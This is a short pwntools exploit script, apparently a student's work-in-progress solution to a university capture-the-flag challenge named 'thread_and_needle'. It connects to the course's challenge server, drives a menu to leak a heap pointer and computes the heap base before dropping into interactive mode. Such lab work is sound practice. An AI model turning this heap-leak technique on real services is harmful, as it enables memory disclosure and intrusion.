from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

CHALLENGE = "thread_and_needle"
PORT = 1211
NETID = b"os2178"
LOCAL = False
if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

def setup(name, length, type, guess):
    p.sendline(b'1')
    __edit(name, length, type, guess)

def __edit(name, length, type, guess):
    p.recvuntil(b'> ')
    p.sendline(name)
    p.recvuntil(b'> ')
    p.sendline(str(length).encode())
    p.recvuntil(b'> ')
    p.sendline(type)
    p.recvuntil(b'guesses?\n')
    p.sendline(guess)
    p.recvuntil(b'> ')

def make(guess):
    p.sendline(b'3')
    p.recvuntil(b'guesses?\n')
    p.sendline(guess)
    p.recvuntil(b'> ')

def edit(name, length, type, guess):
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'length: ')
    return(int(p.recvline().strip(), 16))

p.recvuntil(b'> ')
setup(b"bob", 1, b"joe", b"whateva")
make("no")
leak = edit(b"hello", 1, "joe", b"blegh")
print(leak)

p.recvuntil(b'> ')
p.sendline("hi")
p.recvuntil(b'> ')
p.sendline(str("hi").encode())
p.recvuntil(b'> ')
p.sendline("hi")
p.recvuntil(b'guesses?\n')

heap_base = (leak - 8) & ~0xfff
p.sendline(str(heap_base).encode())

print(heap_base)

p.interactive()